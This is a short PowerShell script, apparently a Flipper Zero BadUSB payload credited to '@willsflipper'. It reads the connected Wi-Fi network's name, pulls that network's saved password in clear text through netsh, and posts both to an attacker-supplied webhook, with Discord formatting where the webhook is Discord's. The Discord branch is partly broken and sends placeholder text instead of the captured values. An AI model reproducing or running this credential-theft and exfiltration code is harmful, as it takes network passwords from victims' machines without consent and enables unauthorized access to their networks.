# Created by Will | @willsflipper

# :::       ::: ::::::::::: :::        :::        
# :+:       :+:     :+:     :+:        :+:        
# +:+       +:+     +:+     +:+        +:+        
# +#+  +:+  +#+     +#+     +#+        +#+        
# +#+ +#+#+ +#+     +#+     +#+        +#+        
#  #+#+# #+#+#      #+#     #+#        #+#        
#   ###   ###   ########### ########## ##########

$webhookUrl = "$wh"
$ssid = netsh wlan show interface | Select-String -Pattern ' SSID '
$ssid = [string]$ssid
$pos = $ssid.IndexOf(':')
$ssid = $ssid.Substring($pos+2).Trim()
$pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
if ($webhookUrl -Contains 'discord.com/api/webhooks/') {
  $json = @"{"content": null,"embeds": [{"title": "ssid: $","description": "pass: WIFI-PASS","color": 16753920,"author": {"name": "WiFi Recieved"},"footer": {"text": "will | @willsflipper","icon_url": "https://thumb.tildacdn.com/tild6664-3230-4633-b839-313833343662/-/resize/300x/-/format/webp/qFlipper_macOS_256px.png"}}]}"@
  Invoke-WebRequest -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($json)
} else {
  Invoke-WebRequest -Method Post -Uri "$webhookUrl" -Body "$ssid : $pass"
}
